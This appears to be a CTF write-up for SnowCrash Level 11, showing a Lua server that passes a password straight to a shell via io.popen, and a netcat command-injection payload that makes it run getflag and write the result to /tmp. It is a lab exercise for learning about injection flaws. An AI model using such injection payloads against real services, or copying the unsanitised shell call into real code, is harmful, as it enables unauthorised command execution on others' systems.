---
title: 42 SnowCrash Level11 - Walkthrough 🤖
tags:
  - ctf
  - snowcrash
  - command-injection
  - lua
  - script
  - exploit
categories:
  - ctfs
  - 42project
date: 2024-05-19 13:26:27
---

## Introduction

In Level 11, we are provided with a Lua script that starts a server on port 5151. The objective is to exploit a security vulnerability in this script to gain unauthorized access.

## Step-by-Step Guide
### Step 1: Understanding the Lua Script

First, let's examine the Lua script located in the home directory of Level 11. The script starts a server on port 5151.

Here is the content of the Lua script:
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end

  client:close()
end
```

### Step 2: Identifying the Vulnerability
The vulnerability lies in the hash function, specifically in this line:
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```
The input pass is directly concatenated into a shell command without any sanitization, leading to a command injection vulnerability.

### Step 3: Exploiting the Vulnerability

To exploit this vulnerability, we can inject a command to redirect the output of the getflag command to a temporary file.

When you connect to the server on port 5151, you are prompted to enter a password. Since the input is not sanitized, we can inject our payload.

Here is the exploit command:
```lua
echo -e "\$(getflag > /tmp/level12flag)" | nc localhost 5151 && cat /tmp/level12flag
```

### Step 4: Executing the Exploit
    1. Open a terminal and run the following command to connect to the server and inject the payload:
```sh
echo -e "\$(getflag > /tmp/level12flag)" | nc localhost 5151
```
    2. The `getflag` command's output will be redirected to `/tmp/level12flag`.

    3. Next, read the contents of the file to get the flag for Level 12:
```sh
cat /tmp/level12flag
```

### Summary

In this walkthrough, we identified and exploited a command injection vulnerability in a Lua script provided in Level 11 of the Snowcrash project. By injecting a malicious command, we were able to redirect the output of the getflag command to a file and retrieve the flag for the next level.

Feel free to reach out if you have any questions or need further clarification on any steps. Good luck with your continued learning and hacking journey!
